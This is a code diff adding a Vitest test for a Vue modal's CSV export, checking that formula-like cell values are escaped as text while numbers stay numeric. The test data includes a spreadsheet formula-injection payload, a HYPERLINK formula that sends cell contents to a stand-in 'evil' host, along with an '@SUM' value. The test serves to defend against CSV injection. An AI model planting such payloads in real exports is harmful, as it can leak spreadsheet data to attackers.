@@ -1,4 +1,4 @@
-import { describe, it, expect, beforeEach, afterEach } from 'vitest'
+import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
 import { render, fireEvent } from '@testing-library/vue'
 import { setActivePinia, createPinia } from 'pinia'
 import { nextTick } from 'vue'
@@ -168,6 +168,33 @@ describe('CommunityNodeModal', () => {
       await seedStores()
       const { container } = render(CommunityNodeModal, { props: { communityId: 0 } })
       expect(container.querySelector('[data-testid="property-visibility-hint"]')).toBeNull()
+    })
+  })
+
+  describe('CSV export (M4)', () => {
+    it('exports formula-like values as text while numbers stay numbers', async () => {
+      const graphStore = useGraphStore()
+      graphStore.nodes = [
+        { node_id: 'n1', node_type: 'Person', properties: { name: '=HYPERLINK("http://evil/?"&A1,"Click")', balance: '-5' } },
+        { node_id: 'n2', node_type: 'Person', properties: { name: '@SUM(A1)', balance: '10' } },
+      ]
+      const communityStore = useCommunityStore()
+      await nextTick()
+      communityStore.communityMap = new Map([['n1', 0], ['n2', 0]])
+
+      let blob: Blob | undefined
+      vi.spyOn(URL, 'createObjectURL').mockImplementation((b) => { blob = b as Blob; return 'blob:test' })
+      vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => {})
+      vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {})
+
+      const { container } = render(CommunityNodeModal, { props: { communityId: 0 } })
+      await fireEvent.click(container.querySelector('button[title="Export CSV"]')!)
+
+      const csv = await blob!.text()
+      expect(csv).toContain(`"'=HYPERLINK(""http://evil/?""&A1,""Click"")"`)
+      expect(csv).toContain("'@SUM(A1)")
+      expect(csv).not.toMatch(/(^|,)[=@]/m)
+      expect(csv).toMatch(/,-5(,|$)/m)
     })
   })
 })
